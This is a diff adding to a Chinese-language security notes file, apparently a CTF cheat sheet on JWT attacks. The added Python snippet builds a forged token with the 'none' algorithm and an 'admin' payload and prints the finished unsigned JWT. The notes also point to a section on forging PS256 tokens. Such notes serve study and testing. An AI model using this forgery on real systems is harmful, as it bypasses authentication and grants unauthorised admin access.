@@ -84,6 +84,18 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoi5bCP5piOMyIsImlkIjoyLCJleHAiOjE
 
 在线生成：<https://jwt.io/#debugger-io>
 参考：<http://cnblogs.com/vege/p/14468030.html>
+```
+import base64
+
+a = '{"alg":"none","typ":"JWT"}'
+b = '{"secretid":[],"username":"admin","password":"123","iat":1660895973}'
+print(base64.b64encode(a.encode('utf-8')))
+print(base64.b64encode(b.encode('utf-8')))
+
+# 生成eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
+# 生成eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY2MDg5NTk3M30=
+# 于是JWT：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY2MDg5NTk3M30.
+```
 
 ^
 ## **PS256算法的jwt可以伪造**
